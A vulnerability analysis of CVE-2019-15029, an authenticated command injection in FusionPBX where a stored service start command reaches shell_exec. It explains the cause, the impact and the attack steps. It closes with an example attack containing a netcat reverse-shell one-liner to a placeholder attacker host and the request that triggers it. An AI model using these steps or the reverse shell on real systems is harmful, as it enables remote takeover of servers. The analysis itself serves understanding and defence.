Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2019-15029:

**Root Cause:**

The vulnerability stems from the insecure use of the `shell_exec` function in the `services.php` file. Specifically, user-controlled input, meant to be the start command for a service, is directly passed to `shell_exec` without proper sanitization.

**Weaknesses/Vulnerabilities Present:**

*   **Command Injection:** The primary vulnerability is a command injection. The `service_cmd_start` variable, which is retrieved from the database, is directly passed to `shell_exec`. This allows an attacker to inject arbitrary shell commands.
*   **Insufficient Input Sanitization:** The `check_str` function, intended to sanitize input, only focuses on preventing SQL injection and does not filter out or sanitize characters that are used for command injection.
*   **Unrestricted Service Creation:** The application allows authenticated users to create new services and specify arbitrary "start" commands. There is no validation that the service exists or that the command is safe to execute.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** Successful exploitation allows an attacker to execute arbitrary commands on the server with the privileges of the webserver process.
*   **Full System Compromise:** By achieving RCE, an attacker can potentially gain complete control of the affected server.

**Attack Vectors:**

*   **Web Interface:** The attack is carried out via the web interface of the FusionPBX application.
*   **Authenticated Access:** The attacker needs to have valid login credentials to the FusionPBX application to create a malicious service.

**Required Attacker Capabilities/Position:**

*   **Authentication:** The attacker must have valid user credentials to log in to the FusionPBX web interface.
*   **Network Access:** The attacker needs network access to the FusionPBX server to send HTTP requests.
*  **Understanding of the application:** The attacker should know how to create a new service and manipulate the service start command

**Detailed Vulnerability Breakdown:**

1.  **Service Creation:**
    *   An authenticated attacker uses the `service_edit.php` to create a new service.
    *   The attacker provides a malicious command in the `service_cmd_start` field within the POST request.
    *   The `service_cmd_start` value is passed through the `check_str()` function which does not sanitize the value for shell command injection.
    *   The malicious command is stored in the database along with other service details.

2.  **Service Execution:**
    *   The attacker crafts a GET request to `services.php`, providing the service ID (`id`) and setting the action parameter (`a`) to `start`.
    *   The `services.php` script fetches service details, including the malicious `service_cmd_start`, from the database.
    *   The script then executes the `service_cmd_start` value through `shell_exec()`.

**Example Attack:**

1.  Login to FusionPBX.
2.  Create a new service via `service_edit.php` with a malicious command (e.g., `rm /tmp/z;mkfifo /tmp/z;cat /tmp/z|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/z`) as the start command.
3.  Get the UUID for the created service.
4.  Send a request to `services.php?id=<service_uuid>&a=start` to execute the stored command.
